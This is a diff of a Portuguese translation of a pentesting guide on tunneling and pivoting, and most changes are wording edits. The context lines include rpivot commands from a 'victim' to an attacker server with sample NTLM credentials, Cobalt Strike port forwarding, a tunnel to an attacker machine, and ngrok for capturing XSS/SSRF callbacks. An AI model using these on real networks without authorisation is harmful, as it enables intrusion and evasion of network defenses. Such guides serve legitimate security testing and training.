@@ -5,7 +5,7 @@
 ## Dica do Nmap
 
 > [!WARNING]
-> **ICMP** e **SYN** scans não podem ser tunelados através de proxies socks, então devemos **desativar a descoberta por ping** (`-Pn`) e especificar **scans TCP** (`-sT`) para que isso funcione.
+> **ICMP** e **SYN** scans não podem ser tunelados através de proxies socks, então devemos **desativar a descoberta de ping** (`-Pn`) e especificar **scans TCP** (`-sT`) para que isso funcione.
 
 ## **Bash**
 
@@ -93,7 +93,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 
 ## SSHUTTLE
 
-Você pode **tunar** via **ssh** todo o **tráfego** para uma **sub-rede** através de um host.\
+Você pode **túnel** via **ssh** todo o **tráfego** para uma **sub-rede** através de um host.\
 Por exemplo, encaminhando todo o tráfego que vai para 10.10.10.0/24
 ```bash
 pip install sshuttle
@@ -163,7 +163,7 @@ Para notar:
 ### rPort2Port local
 
 > [!WARNING]
-> Neste caso, a **porta é aberta no host do beacon**, não no Servidor da Equipe, e o **tráfego é enviado para o cliente Cobalt Strike** (não para o Servidor da Equipe) e de lá para o host:porta indicado.
+> Neste caso, a **porta é aberta no host do beacon**, não no Servidor da Equipe e o **tráfego é enviado para o cliente Cobalt Strike** (não para o Servidor da Equipe) e de lá para o host:porta indicado.
 ```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
@@ -250,7 +250,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-Pivotar através do **NTLM proxy**
+Fazer pivot através do **NTLM proxy**
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -348,7 +348,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 Você precisa ter **acesso RDP sobre o sistema**.\
 Baixe:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta ferramenta utiliza `Dynamic Virtual Channels` (`DVC`) do recurso de Serviço de Área de Trabalho Remota do Windows. DVC é responsável por **tunneling de pacotes sobre a conexão RDP**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta ferramenta usa `Dynamic Virtual Channels` (`DVC`) do recurso de Serviço de Área de Trabalho Remota do Windows. DVC é responsável por **tunneling de pacotes sobre a conexão RDP**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 No seu computador cliente, carregue **`SocksOverRDP-Plugin.dll`** assim:
@@ -377,7 +377,7 @@ Em **Profile -> Proxification Rules** adicione o nome do programa a ser proxific
 ## Bypass de proxy NTLM
 
 A ferramenta mencionada anteriormente: **Rpivot**\
-**OpenVPN** também pode contorná-lo, configurando essas opções no arquivo de configuração:
+**OpenVPN** também pode contorná-lo, configurando estas opções no arquivo de configuração:
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
@@ -394,7 +394,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Agora, se você configurar, por exemplo, o serviço **SSH** na vítima para escutar na porta 443. Você pode se conectar a ele através da porta 2222 do atacante.\
+Agora, se você configurar, por exemplo, no alvo, o serviço **SSH** para escutar na porta 443. Você pode se conectar a ele através da porta 2222 do atacante.\
 Você também poderia usar um **meterpreter** que se conecta a localhost:443 e o atacante está escutando na porta 2222.
 
 ## YARP
@@ -444,7 +444,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Mudar o DNS do proxychains
 
-Proxychains intercepta a chamada `gethostbyname` da libc e encaminha a solicitação de DNS tcp através do proxy socks. Por **padrão**, o servidor **DNS** que o proxychains usa é **4.2.2.2** (hardcoded). Para mudá-lo, edite o arquivo: _/usr/lib/proxychains3/proxyresolv_ e altere o IP. Se você estiver em um **ambiente Windows**, pode definir o IP do **controlador de domínio**.
+Proxychains intercepta a chamada `gethostbyname` da libc e encaminha a solicitação de DNS tcp através do proxy socks. Por **padrão**, o servidor **DNS** que o proxychains usa é **4.2.2.2** (codificado). Para mudá-lo, edite o arquivo: _/usr/lib/proxychains3/proxyresolv_ e altere o IP. Se você estiver em um **ambiente Windows**, pode definir o IP do **controlador de domínio**.
 
 ## Túneis em Go
 
@@ -498,7 +498,7 @@ chmod a+x ./ngrok
 
 **Documentação:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-_É também possível adicionar autenticação e TLS, se necessário._
+_Também é possível adicionar autenticação e TLS, se necessário._
 
 #### Tunneling TCP
 ```bash
@@ -513,12 +513,12 @@ _É também possível adicionar autenticação e TLS, se necessário._
 ./ngrok http file:///tmp/httpbin/
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
 ```
-#### Capturando chamadas HTTP
+#### Captura de chamadas HTTP
 
-_Utilizado para XSS, SSRF, SSTI ..._\
+_Util útil para XSS, SSRF, SSTI ..._\
 Diretamente do stdout ou na interface HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).
 
-#### Tunelando serviço HTTP interno
+#### Tunelamento de serviço HTTP interno
 ```bash
 ./ngrok http localhost:8080 --host-header=rewrite
 # Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
@@ -576,7 +576,7 @@ Porque todo o tráfego sai do host **saindo pela porta 443**, os túneis Cloudfl
 
 ## FRP (Fast Reverse Proxy)
 
-[`frp`](https://github.com/fatedier/frp) é um proxy reverso em Go que é mantido ativamente e suporta **TCP, UDP, HTTP/S, SOCKS e P2P NAT-hole-punching**. A partir da **v0.53.0 (Maio de 2024)**, ele pode atuar como um **Gateway de Túnel SSH**, permitindo que um host alvo crie um túnel reverso usando apenas o cliente OpenSSH padrão – nenhum binário extra é necessário.
+[`frp`](https://github.com/fatedier/frp) é um proxy reverso em Go que é mantido ativamente e suporta **TCP, UDP, HTTP/S, SOCKS e P2P NAT-hole-punching**. A partir da **v0.53.0 (Maio de 2024)**, ele pode atuar como um **SSH Tunnel Gateway**, permitindo que um host alvo crie um túnel reverso usando apenas o cliente OpenSSH padrão – nenhum binário extra é necessário.
 
 ### Túnel TCP reverso clássico
 ```bash
